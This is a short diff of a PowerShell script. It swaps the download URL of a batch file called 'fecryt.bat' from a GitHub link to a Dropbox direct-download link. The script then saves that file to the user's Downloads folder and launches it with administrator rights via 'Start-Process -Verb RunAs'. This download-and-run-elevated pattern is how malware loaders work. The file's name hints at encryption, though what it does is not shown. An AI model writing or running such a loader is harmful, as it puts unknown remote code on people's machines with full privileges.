@@ -1,3 +1,3 @@
-Invoke-WebRequest -Uri "https://github.com/mo1sss/sss/blob/main/fecryt.bat" -OutFile "$env:USERPROFILE\Downloads\fecryt.bat"
+Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/ybry7pxcit68eca537dfy/fecryt.bat?rlkey=ynw2pgidvz1d0gfgfobxxn2e4&st=k2znm85w&dl=1" -OutFile "$env:USERPROFILE\Downloads\fecryt.bat"
 Start-Process -FilePath "$env:USERPROFILE\Downloads\fecryt.bat" -Verb RunAs
 
